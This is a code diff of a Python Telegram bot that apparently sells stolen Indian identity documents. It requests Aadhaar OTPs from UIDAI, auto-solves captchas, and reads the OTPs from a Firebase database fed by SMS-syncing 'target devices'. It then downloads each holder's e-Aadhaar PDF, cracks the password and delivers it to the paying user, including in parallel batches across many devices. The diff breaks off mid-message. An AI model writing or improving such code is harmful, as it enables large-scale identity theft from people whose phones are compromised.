@@ -423,6 +423,31 @@ def send_message(chat_id, text, reply_markup=None):
         logger.error(f"Error sending message: {e}")
         return None
 
+def edit_message_text(chat_id, message_id, text, reply_markup=None):
+    if not message_id:
+        return None
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+    text = format_custom_emojis(text)
+    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'HTML'}
+    if reply_markup:
+        payload['reply_markup'] = reply_markup
+    try:
+        response = get_telegram_session().post(url, json=payload, timeout=10)
+        res = response.json()
+        if not res.get('ok'):
+            desc = str(res.get('description', '')).lower()
+            if 'message is not modified' in desc:
+                return res
+            if 'parse entities' in desc:
+                payload['text'] = re.sub(r'<[^>]+>', '', text)
+                payload['parse_mode'] = None
+                return get_telegram_session().post(url, json=payload, timeout=10).json()
+            logger.debug(f"editMessageText non-ok for {chat_id}/{message_id}: {res}")
+        return res
+    except Exception as e:
+        logger.debug(f"Error editing message {message_id}: {e}")
+        return None
+
 def answer_callback_query(callback_query_id, text=None):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
     data = {'callback_query_id': callback_query_id}
@@ -847,194 +872,218 @@ def deliver_pdf(chat_id, pdf_path, verified_name, is_batch=False):
         )
 
 # ============== FIREBASE WORKERS & DEVICE SCANNER ==============
-def _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=None, is_batch=False):
+def _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=None, is_batch=False, progress_msg_id=None):
     masked_mobile = f"{mobile[:2]}******{mobile[-2:]}"
-    send_message(
-        chat_id,
-        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-        f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
-        f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked_mobile}</code>\n"
-        f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…</code>\n\n"
-        f"<i>⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…</i>"
-    )
+    task_user_id = f"{chat_id}_{mobile}"
+
+    def update_single_status(status_str, detail_str):
+        if not is_batch and progress_msg_id:
+            edit_message_text(
+                chat_id, progress_msg_id,
+                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
+                f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked_mobile}</code>\n"
+                f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>{status_str}</code>\n\n"
+                f"<i>{detail_str}</i>"
+            )
+
+    update_single_status("sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…", "⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…")
 
     sess = get_session(chat_id)
     if sess.get('step') != 'downloading':
-        return False
+        return False, {'error': 'Session cancelled', 'mobile': mobile}
 
     # Auto-send Mobile OTP 1
     otp_sent_time = time.time()
-    ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(chat_id, mobile, "Mr")
+    ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(task_user_id, mobile, "Mr")
     if not ok or not otp_txn:
+        err_text = str(err or 'Failed to send OTP')
+        logger.warning(f"OTP 1 send failed for {mobile}: {err_text}")
         if not is_batch:
             clear_session(chat_id)
-        err_text = str(err or 'Failed to send OTP')
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
-            f"⚠️  {html.escape(err_text)}",
-            reply_markup=get_menu_keyboard() if not is_batch else None
-        )
-        return False
+            if progress_msg_id:
+                edit_message_text(
+                    chat_id, progress_msg_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
+                    f"⚠️  {html.escape(err_text)}",
+                    reply_markup=get_menu_keyboard()
+                )
+            else:
+                send_message(
+                    chat_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
+                    f"⚠️  {html.escape(err_text)}",
+                    reply_markup=get_menu_keyboard()
+                )
+        return False, {'error': err_text, 'mobile': mobile}
 
-    # Inform user bot is monitoring Firebase
-    send_message(
-        chat_id,
-        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-        f"<b>📩 ᴏᴛᴘ 1 sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n\n"
-        f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked_mobile}</code>\n"
-        f"⏳  <b>ᴠᴀʟɪᴅɪᴛʏ</b>  ·  10 Minutes\n\n"
-        f"<i>🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 1 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…</i>"
-    )
+    update_single_status("ᴏᴛᴘ 1 sᴇɴᴛ!", "🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 1 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…")
 
     sess = get_session(chat_id)
     if sess.get('step') != 'downloading':
-        return False
+        return False, {'error': 'Session cancelled', 'mobile': mobile}
 
     # Poll Firebase for OTP 1 (using device_id for instant lookup)
     found1, otp1, msg1 = bot.fetch_otp_from_firebase(
         fb_url, min_timestamp=otp_sent_time - 30, timeout=75, poll_interval=3, target_mobile=mobile, device_id=dev_id
     )
     if not found1 or not otp1:
+        logger.warning(f"OTP 1 timeout for {mobile}")
         if not is_batch:
             clear_session(chat_id)
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"<b>⏱️ ᴏᴛᴘ 1 ᴛɪᴍᴇᴏᴜᴛ</b> (<code>{masked_mobile}</code>)\n\n"
-            f"⚠️  ɴᴏ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.\n"
-            f"💡  <i>ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪs ᴏɴʟɪɴᴇ ᴀɴᴅ sʏɴᴄɪɴɢ sᴍs.</i>",
-            reply_markup=get_menu_keyboard() if not is_batch else None
-        )
-        return False
+            if progress_msg_id:
+                edit_message_text(
+                    chat_id, progress_msg_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"<b>⏱️ ᴏᴛᴘ 1 ᴛɪᴍᴇᴏᴜᴛ</b> (<code>{masked_mobile}</code>)\n\n"
+                    f"⚠️  ɴᴏ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.\n"
+                    f"💡  <i>ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪs ᴏɴʟɪɴᴇ ᴀɴᴅ sʏɴᴄɪɴɢ sᴍs.</i>",
+                    reply_markup=get_menu_keyboard()
+                )
+        return False, {'error': 'OTP 1 Timeout', 'mobile': mobile}
 
     sess = get_session(chat_id)
     if sess.get('step') != 'downloading':
-        return False
+        return False, {'error': 'Session cancelled', 'mobile': mobile}
 
-    # Verify OTP 1 & retrieve EID
-    send_message(
-        chat_id,
-        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-        f"<b>⚡ ᴏᴛᴘ 1 ᴅᴇᴛᴇᴄᴛᴇᴅ: <code>{otp1}</code></b>\n\n"
-        f"<i>🔄  ᴠᴇʀɪғʏɪɴɢ ᴏᴛᴘ 1 &amp; ʀᴇᴛʀɪᴇᴠɪɴɢ ᴇɪᴅ…</i>"
-    )
+    update_single_status(f"ᴏᴛᴘ 1: <code>{otp1}</code>", "🔄  ᴠᴇʀɪғʏɪɴɢ ᴏᴛᴘ 1 &amp; ʀᴇᴛʀɪᴇᴠɪɴɢ ᴇɪᴅ…")
 
-    res = bot.verify_eid_otp(chat_id, mobile, "Mr", otp1, otp_txn, c_txn, code)
+    res = bot.verify_eid_otp(task_user_id, mobile, "Mr", otp1, otp_txn, c_txn, code)
     if len(res) == 4:
         success, eid_number, verified_name, dob = res
     else:
         success, eid_number, verified_name = res
 
     if not success or not eid_number:
+        v_err = str(verified_name or 'Invalid OTP')
+        logger.warning(f"OTP 1 verification failed for {mobile}: {v_err}")
         if not is_batch:
             clear_session(chat_id)
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"❌  <b>ᴏᴛᴘ 1 ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n\n"
-            f"⚠️  {html.escape(str(verified_name or 'Invalid OTP'))}",
-            reply_markup=get_menu_keyboard() if not is_batch else None
-        )
-        return False
+            if progress_msg_id:
+                edit_message_text(
+                    chat_id, progress_msg_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"❌  <b>ᴏᴛᴘ 1 ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n\n"
+                    f"⚠️  {html.escape(v_err)}",
+                    reply_markup=get_menu_keyboard()
+                )
+        return False, {'error': v_err, 'mobile': mobile}
 
     name_display = verified_name or "Aadhaar Holder"
     eid_clean = str(eid_number).replace('/', '').replace(' ', '')
 
-    send_message(
-        chat_id,
-        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-        f"<b>✅ ᴇɪᴅ ʀᴇᴛʀɪᴇᴠᴇᴅ</b>\n\n"
-        f"👤  <b>ɴᴀᴍᴇ</b>  ·  <b>{html.escape(name_display)}</b>\n"
-        f"🆔  <b>ᴇɪᴅ</b>   ·  <code>{eid_clean}</code>\n\n"
-        f"<i>🔄  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; sᴇɴᴅɪɴɢ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2…</i>"
-    )
+    update_single_status("ᴇɪᴅ ʀᴇᴛʀɪᴇᴠᴇᴅ", f"🆔  <b>ᴇɪᴅ:</b> <code>{eid_clean}</code>\n<i>🔄  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; sᴇɴᴅɪɴɢ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2…</i>")
 
     sess = get_session(chat_id)
     if sess.get('step') != 'downloading':
-        return False
+        return False, {'error': 'Session cancelled', 'mobile': mobile}
 
     # Auto-send OTP 2 (Download OTP)
     otp2_sent_time = time.time()
-    dl_res = bot.auto_send_aadhaar_otp(chat_id, eid_clean, max_retries=6)
+    dl_res = bot.auto_send_aadhaar_otp(task_user_id, eid_clean, max_retries=6)
     if not dl_res[0]:
+        err2 = dl_res[5] if len(dl_res) > 5 else "Failed to send download OTP"
+        logger.warning(f"Download OTP 2 send failed for {mobile}: {err2}")
         if not is_batch:
             clear_session(chat_id)
-        err2 = dl_res[5] if len(dl_res) > 5 else "Failed to send download OTP"
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 ғᴀɪʟᴇᴅ</b>\n\n"
-            f"⚠️  {html.escape(str(err2))}",
-            reply_markup=get_menu_keyboard() if not is_batch else None
-        )
-        return False
+            if progress_msg_id:
+                edit_message_text(
+                    chat_id, progress_msg_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 ғᴀɪʟᴇᴅ</b>\n\n"
+                    f"⚠️  {html.escape(str(err2))}",
+                    reply_markup=get_menu_keyboard()
+                )
+        return False, {'error': str(err2), 'mobile': mobile}
 
     dl_otp_txn = dl_res[1]
     dl_t_id = dl_res[4]
 
-    send_message(
-        chat_id,
-        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-        f"<b>📩 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 sᴇɴᴛ!</b>\n\n"
-        f"<i>🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 2 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…</i>"
-    )
+    update_single_status("ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 sᴇɴᴛ!", "🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 2 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…")
 
     sess = get_session(chat_id)
     if sess.get('step') != 'downloading':
-        return False
+        return False, {'error': 'Session cancelled', 'mobile': mobile}
 
     # Poll Firebase for OTP 2 (excluding otp1)
     found2, otp2, msg2 = bot.fetch_otp_from_firebase(
         fb_url, min_timestamp=otp2_sent_time - 30, timeout=75, poll_interval=3, target_mobile=mobile, exclude_otps=[otp1], device_id=dev_id
     )
     if not found2 or not otp2:
+        logger.warning(f"OTP 2 timeout for {mobile}")
         if not is_batch:
             clear_session(chat_id)
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"<b>⏱️ ᴏᴛᴘ 2 ᴛɪᴍᴇᴏᴜᴛ</b>\n\n"
-            f"⚠️  ɴᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.",
-            reply_markup=get_menu_keyboard() if not is_batch else None
-        )
-        return False
+            if progress_msg_id:
+                edit_message_text(
+                    chat_id, progress_msg_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"<b>⏱️ ᴏᴛᴘ 2 ᴛɪᴍᴇᴏᴜᴛ</b>\n\n"
+                    f"⚠️  ɴᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.",
+                    reply_markup=get_menu_keyboard()
+                )
+        return False, {'error': 'OTP 2 Timeout', 'mobile': mobile}
 
     sess = get_session(chat_id)
     if sess.get('step') != 'downloading':
-        return False
+        return False, {'error': 'Session cancelled', 'mobile': mobile}
 
-    # OTP 2 Captured! Download & decrypt PDF!
-    send_message(
-        chat_id,
-        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-        f"<b>⚡ ᴏᴛᴘ 2 ᴅᴇᴛᴇᴄᴛᴇᴅ: <code>{otp2}</code></b>\n\n"
-        f"<i>⏳  ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ ғʀᴏᴍ ᴜɪᴅᴀɪ…</i>"
-    )
+    update_single_status(f"ᴏᴛᴘ 2: <code>{otp2}</code>", "⏳  ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ &amp; ᴜɴʟᴏᴄᴋɪɴɢ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ…")
 
     dl_ok, result = bot.download_aadhaar_pdf(
-        chat_id, eid_clean, otp2, dl_otp_txn, transaction_id=dl_t_id, sticky_proxy=bot.user_proxies.get(chat_id)
+        task_user_id, eid_clean, otp2, dl_otp_txn, transaction_id=dl_t_id, sticky_proxy=bot.user_proxies.get(task_user_id)
     )
     if not dl_ok:
+        logger.warning(f"PDF download failed for {mobile}: {result}")
         if not is_batch:
             clear_session(chat_id)
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ</b>\n\n"
-            f"⚠️  {html.escape(str(result or 'UIDAI download failed'))}",
-            reply_markup=get_menu_keyboard() if not is_batch else None
-        )
-        return False
+            if progress_msg_id:
+                edit_message_text(
+                    chat_id, progress_msg_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ</b>\n\n"
+                    f"⚠️  {html.escape(str(result or 'UIDAI download failed'))}",
+                    reply_markup=get_menu_keyboard()
+                )
+        return False, {'error': str(result), 'mobile': mobile}
 
-    # Deliver unlocked PDF!
-    deliver_pdf(chat_id, result, name_display, is_batch=is_batch)
-    return True
+    # CRACK PDF
+    crack_ok, password, decrypted_path = bot.crack_pdf_with_name(result, name_display)
+    final_pdf_path = decrypted_path if (crack_ok and decrypted_path and os.path.exists(decrypted_path)) else result
+    if crack_ok and decrypted_path and os.path.exists(result):
+        try:
+            os.remove(result)
+        except Exception:
+            pass
+
+    if not is_batch:
+        if progress_msg_id:
+            delete_message(chat_id, progress_msg_id)
+        deliver_pdf(chat_id, final_pdf_path, name_display, is_batch=False)
+        return True, None
+
+    return True, {
+        'pdf_path': final_pdf_path,
+        'name': name_display,
+        'password': password if crack_ok else None,
+        'is_unlocked': crack_ok,
+        'mobile': mobile
+    }
 
 def _handle_firebase_download_worker(chat_id, mobile, fb_url, dev_id=None):
     try:
-        _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=dev_id, is_batch=False)
+        masked = f"{mobile[:2]}******{mobile[-2:]}"
+        init_res = send_message(
+            chat_id,
+            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+            f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
+            f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked}</code>\n"
+            f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…</code>\n\n"
+            f"<i>⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…</i>"
+        )
+        prog_id = (init_res.get('result') or {}).get('message_id') if init_res else None
+        _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=dev_id, is_batch=False, progress_msg_id=prog_id)
     except Exception as e:
         logger.error(f"Error in firebase download worker: {e}", exc_info=True)
         clear_session(chat_id)
@@ -1050,67 +1099,153 @@ def _handle_firebase_download_worker(chat_id, mobile, fb_url, dev_id=None):
 def _handle_firebase_batch_worker(chat_id, fb_url, devices):
     try:
         total = len(devices)
-        successful = 0
-        failed = 0
+        concurrency = min(5, total)
 
-        send_message(
+        start_res = send_message(
             chat_id,
             f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"<b>🚀 sᴛᴀʀᴛɪɴɢ ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ</b>\n\n"
-            f"📊  <b>ᴛᴏᴛᴀʟ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ:</b> <b>{total}</b>\n"
+            f"<b>🚀 ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ sᴛᴀʀᴛᴇᴅ</b>\n\n"
+            f"📊  <b>ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇs:</b> <b>{total}</b>\n"
+            f"⚙️  <b>ᴘᴀʀᴀʟʟᴇʟ ᴛᴀsᴋs:</b> <b>{concurrency} Background Threads</b>\n"
             f"🌐  <b>ғɪʀᴇʙᴀsᴇ:</b> <code>{fb_url}</code>\n\n"
-            f"<i>⚡  ᴇᴀᴄʜ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ ᴡɪʟʟ ʙᴇ ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ &amp; sᴇɴᴛ ʜᴇʀᴇ ᴀs sᴏᴏɴ ᴀs ɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇs…</i>"
+            f"<i>⏳  Multi-task background engine running… All unlocked PDFs will be sent below once extraction completes.</i>"
         )
+        progress_msg_id = (start_res.get('result') or {}).get('message_id') if start_res else None
 
-        for idx, dev in enumerate(devices, start=1):
+        ready_pdfs = []
+        lock = threading.Lock()
+        completed_count = 0
+        failed_count = 0
+        last_edit_time = [0.0]
+
+        def update_dashboard():
+            if not progress_msg_id:
+                return
+            now = time.time()
+            if now - last_edit_time[0] < 2.5 and completed_count < total:
+                return
+            last_edit_time[0] = now
+            in_prog = max(0, total - completed_count)
+            dash_text = (
+                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                f"<b>⚡ ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ ɪɴ ᴘʀᴏɢʀᴇss</b>\n\n"
+                f"📊  <b>ᴘʀᴏɢʀᴇss:</b> <b>[{completed_count}/{total}] Devices</b>\n"
+                f"✅  <b>ᴘᴅғs ʀᴇᴀᴅʏ:</b> <b>{len(ready_pdfs)}</b>\n"
+                f"❌  <b>ғᴀɪʟᴇᴅ / sᴋɪᴘ:</b> <b>{failed_count}</b>\n"
+                f"⚙️  <b>ᴀᴄᴛɪᴠᴇ ᴛᴀsᴋs:</b> <b>{in_prog}</b>\n\n"
+                f"<i>⏳  Background multi-processing running…</i>"
+            )
+            edit_message_text(chat_id, progress_msg_id, dash_text)
+
+        def worker_task(dev_info, task_idx):
+            nonlocal completed_count, failed_count
             sess = get_session(chat_id)
             if sess.get('step') != 'downloading':
-                break
+                with lock:
+                    completed_count += 1
+                return
 
             if not (is_admin(chat_id) or has_credits(chat_id)):
-                send_message(
-                    chat_id,
-                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-                    f"⚠️  <b>ɪɴsᴜғғɪᴄɪᴇɴᴛ ᴄʀᴇᴅɪᴛs!</b>\n\n"
-                    f"ʙᴀᴛᴄʜ sᴛᴏᴘᴘᴇᴅ ᴀᴛ <b>{successful}/{total}</b> PDFs.\n"
-                    f"ᴘʟᴇᴀsᴇ ʀᴇᴄʜᴀʀɢᴇ ᴄʀᴇᴅɪᴛs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.",
-                    reply_markup=get_buy_keyboard()
-                )
-                break
+                with lock:
+                    failed_count += 1
+                    completed_count += 1
+                return
 
-            mob = dev.get('mobile')
-            dev_id = dev.get('dev_id')
-            model = dev.get('model', 'Device')
+            mob = dev_info.get('mobile')
+            dev_id = dev_info.get('dev_id')
             if not mob:
-                continue
+                with lock:
+                    failed_count += 1
+                    completed_count += 1
+                return
 
-            send_message(
-                chat_id,
-                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-                f"<b>⏳ [{idx}/{total}] ᴘʀᴏᴄᴇssɪɴɢ ᴅᴇᴠɪᴄᴇ</b>\n\n"
-                f"📱  <b>ᴍᴏʙɪʟᴇ:</b> <code>+91 {mob}</code> ({model})\n"
-                f"<i>🚀  ʀᴇǫᴜᴇsᴛɪɴɢ ᴜɪᴅᴀɪ ᴏᴛᴘ 1…</i>"
+            logger.info(f"[Batch Task {task_idx}] Processing mobile: {mob}, dev_id: {dev_id}")
+            ok, res_data = _execute_single_firebase_download(
+                chat_id, mob, fb_url, dev_id=dev_id, is_batch=True
             )
 
-            ok = _execute_single_firebase_download(chat_id, mob, fb_url, dev_id=dev_id, is_batch=True)
-            if ok:
-                successful += 1
-            else:
-                failed += 1
+            with lock:
+                completed_count += 1
+                if ok and res_data and res_data.get('pdf_path'):
+                    ready_pdfs.append(res_data)
+                else:
+                    failed_count += 1
+                update_dashboard()
 
-            time.sleep(2)
+        # Run multi-threaded background pool
+        with ThreadPoolExecutor(max_workers=concurrency) as executor:
+            futures = [executor.submit(worker_task, dev, i) for i, dev in enumerate(devices, start=1)]
+            for fut in as_completed(futures):
+                try:
+                    fut.result()
+                except Exception as e:
+                    logger.error(f"Error in batch future: {e}", exc_info=True)
+
+        # Final dashboard update
+        if progress_msg_id:
+            final_dash = (
+                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                f"<b>✅ ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴇxᴛʀᴀᴄᴛɪᴏɴ ғɪɴɪsʜᴇᴅ!</b>\n\n"
+                f"📊  <b>ᴛᴏᴛᴀʟ ᴘʀᴏᴄᴇssᴇᴅ:</b> <b>{total}</b>\n"
+                f"✅  <b>ᴘᴅғs ᴇxᴛʀᴀᴄᴛᴇᴅ:</b> <b>{len(ready_pdfs)}</b>\n"
+                f"❌  <b>ғᴀɪʟᴇᴅ / sᴋɪᴘ:</b> <b>{failed_count}</b>\n\n"
+                f"<i>📤  ᴅᴇʟɪᴠᴇʀɪɴɢ ᴀʟʟ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs ʙᴇʟᴏᴡ…</i>"
+            )
+            edit_message_text(chat_id, progress_msg_id, final_dash)
+
+        # DELIVER ALL EXTRACTED PDFS!
+        if ready_pdfs:
+            for item in ready_pdfs:
+                p_path = item.get('pdf_path')
+                p_name = item.get('name') or "Aadhaar Holder"
+                p_pass = item.get('password')
+                p_unlocked = item.get('is_unlocked', False)
+
+                if p_path and os.path.exists(p_path):
+                    if p_unlocked and p_pass:
+                        caption = (
+                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                            f"<b>✅ ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ (ᴜɴʟᴏᴄᴋᴇᴅ)</b>\n\n"
+                            f"👤  <b>ɴᴀᴍᴇ</b>      ·  <b>{html.escape(p_name)}</b>\n"
+                            f"📄  <b>ғᴏʀᴍᴀᴛ</b>    ·  e-Aadhaar PDF\n"
+                            f"🔓  <b>ᴘᴀssᴡᴏʀᴅ</b>  ·  <code>{p_pass}</code>\n"
+                            f"{DIVIDER}"
+                        )
+                    else:
+                        caption = (
+                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                            f"<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>\n\n"
+                            f"👤  <b>ɴᴀᴍᴇ</b>    ·  {html.escape(p_name)}\n"
+                            f"📄  <b>ғᴏʀᴍᴀᴛ</b>  ·  e-Aadhaar PDF\n"
+                            f"🔒  <b>sᴛᴀᴛᴜs</b>  ·  Password Protected\n"
+                            f"{DIVIDER}\n\n"
+                            f"<i>🔑  ᴘᴀssᴡᴏʀᴅ: First 4 letters of name in CAPITAL + Birth Year</i>"
+                        )
+                    clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', p_name)[:20]
+                    send_document(chat_id, p_path, caption=caption, filename=f"Aadhaar_{clean_fn}.pdf")
+                    try:
+                        os.remove(p_path)
+                    except Exception:
+                        pass
+                    time.sleep(0.5)
+
+            # Deduct credits for delivered PDFs
+            for _ in ready_pdfs:
+                deduct_credit(chat_id)
 
         clear_session(chat_id)
         cr = get_credits(chat_id)
         cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
+
         send_message(
             chat_id,
             f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
             f"<b>🎉 ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n"
-            f"✅  <b>sᴜᴄᴄᴇssғᴜʟ:</b> <b>{successful} PDFs</b>\n"
-            f"❌  <b>ғᴀɪʟᴇᴅ/ᴛɪᴍᴇᴏᴜᴛ:</b> <b>{failed}</b>\n\n"
